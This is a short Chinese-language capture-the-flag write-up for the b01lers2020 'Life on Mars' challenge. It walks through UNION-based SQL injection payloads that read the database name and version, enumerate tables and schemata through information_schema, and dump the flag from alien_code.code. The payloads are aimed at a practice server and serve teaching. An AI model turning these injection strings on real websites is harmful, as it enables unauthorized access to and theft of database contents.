# [b01lers2020]Life on Mars 一个接口的sql schema.schemate表

这里还是很简单的



<img src="https://i-blog.csdnimg.cn/blog_migrate/1a45a2e93a457385d44aadfe922963a9.png" alt="" style="max-height:501px; box-sizing:content-box;" />


啥也没有

然后抓包看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/44c58295a855feaf12dd09799b91f6d1.png" alt="" style="max-height:103px; box-sizing:content-box;" />


发现传递参数 直接尝试sql

然后如果正确就会返回值 否则 返回1

```scss
chryse_planitia union select database(),version()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4e6800f05ef0ede1cabd155892fc940f.png" alt="" style="max-height:69px; box-sizing:content-box;" />


发现回显直接开始注入

```csharp
chryse_planitia union select database(),version()


chryse_planitia union select database(),group_concat(table_name) from information_schema.tables where table_schema="aliens"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ef74e5600db2aa5d77e3e43d72fe9261.png" alt="" style="max-height:50px; box-sizing:content-box;" />


太多了 不切实际一个一个查 看看有没有其他数据库

```scss
chryse_planitia union select database(),group_concat(schema_name) from information_schema.schemata
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4cf398693b46449fccc481c57c8e174a.png" alt="" style="max-height:66px; box-sizing:content-box;" />


然后就是正常的注入

最后查值的时候

```cobol
from alien_code.code 即可
```

```cobol
/query?search=amazonis_planitia union select 1,group_concat(code) from alien_code.code
```